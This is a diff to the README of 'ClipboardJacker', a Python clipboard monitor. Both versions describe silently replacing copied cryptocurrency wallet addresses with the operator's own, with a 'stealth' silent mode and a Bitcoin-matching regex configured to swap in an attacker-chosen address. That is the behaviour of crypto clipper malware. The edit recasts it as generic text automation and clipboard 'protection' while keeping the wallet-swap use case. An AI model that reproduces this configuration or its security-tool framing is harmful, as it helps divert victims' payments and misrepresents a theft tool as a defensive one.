@@ -1,6 +1,6 @@
 # ClipboardJacker 🎯
 
-A powerful Python tool that automatically replaces cryptocurrency wallet addresses in your clipboard with your own addresses. Perfect for protecting against clipboard hijacking attacks and ensuring your crypto transactions go to the right place.
+A powerful Python tool that automatically replaces text in your clipboard based on configurable regex patterns. Perfect for protecting against clipboard hijacking, standardizing text formats, and automating text replacements.
 
 [![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/downloads/)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
@@ -8,18 +8,31 @@ A powerful Python tool that automatically replaces cryptocurrency wallet address
 
 ## 🚀 Features
 
-- 🔒 Automatic clipboard monitoring
-- 💰 Support for multiple cryptocurrencies:
-  - Bitcoin (BTC)
-  - Ethereum (ETH)
-  - Tron (TRX)
-  - Binance Chain (BNB)
-  - Ripple (XRP)
-  - Litecoin (LTC)
-- ⚡ Configurable replacement rules
+- 🔒 Real-time clipboard monitoring
+- ⚡ Regex-based text replacement
 - 🛡️ Rate limiting to prevent excessive replacements
 - 🔕 Silent mode for stealth operation
 - 📊 Pattern statistics tracking
+- 🔄 Cross-platform support (Windows, macOS, Linux)
+
+## 💡 Use Cases
+
+### 🛡️ Security
+- Protect against clipboard hijacking attacks
+- Replace cryptocurrency wallet addresses with your own
+- Mask sensitive information (emails, phone numbers, etc.)
+
+### 🔄 Text Standardization
+- Format dates and times consistently
+- Standardize phone numbers
+- Convert text case (e.g., to Title Case)
+- Replace common typos
+
+### 🚀 Automation
+- Replace placeholder text with actual values
+- Convert markdown to HTML
+- Format code snippets
+- Replace URLs with shortened versions
 
 ## 📦 Installation
 
@@ -42,6 +55,7 @@ from clipboardjacker import ClipboardJacker, Config
 
 # Define your patterns
 patterns = [
+    # Example: Replace cryptocurrency addresses
     {
         "regex": r"bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
         "replace_with": "bc1qyourbitcoinaddresshere",
@@ -49,7 +63,22 @@ patterns = [
         "priority": 1,
         "enabled": True
     },
-    # Add more patterns for other cryptocurrencies...
+    # Example: Format phone numbers
+    {
+        "regex": r"(\d{3})[-.]?(\d{3})[-.]?(\d{4})",
+        "replace_with": r"(\1) \2-\3",
+        "description": "Format phone numbers",
+        "priority": 2,
+        "enabled": True
+    },
+    # Example: Replace email addresses
+    {
+        "regex": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
+        "replace_with": "redacted@example.com",
+        "description": "Mask email addresses",
+        "priority": 3,
+        "enabled": True
+    }
 ]
 
 # Create config
@@ -89,9 +118,9 @@ Create a `config.json` file:
 {
     "patterns": [
         {
-            "regex": "0x[a-fA-F0-9]{40}",
-            "replace_with": "0xyourethereumaddresshere",
-            "description": "Ethereum (ETH) address",
+            "regex": "your-regex-pattern",
+            "replace_with": "replacement-text",
+            "description": "Pattern description",
             "priority": 1,
             "enabled": true
         }
@@ -108,6 +137,7 @@ Create a `config.json` file:
 - Pattern validation to ensure valid regex patterns
 - Silent mode for stealth operation
 - Backup of original clipboard content
+- Priority-based pattern matching
 
 ## 🤝 Contributing
 
@@ -130,7 +160,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🙏 Acknowledgments
 
 - Thanks to all contributors who have helped improve this project
-- Inspired by the need for better clipboard security in cryptocurrency transactions
+- Inspired by the need for better clipboard security and automation
 
 ## 📞 Support
 
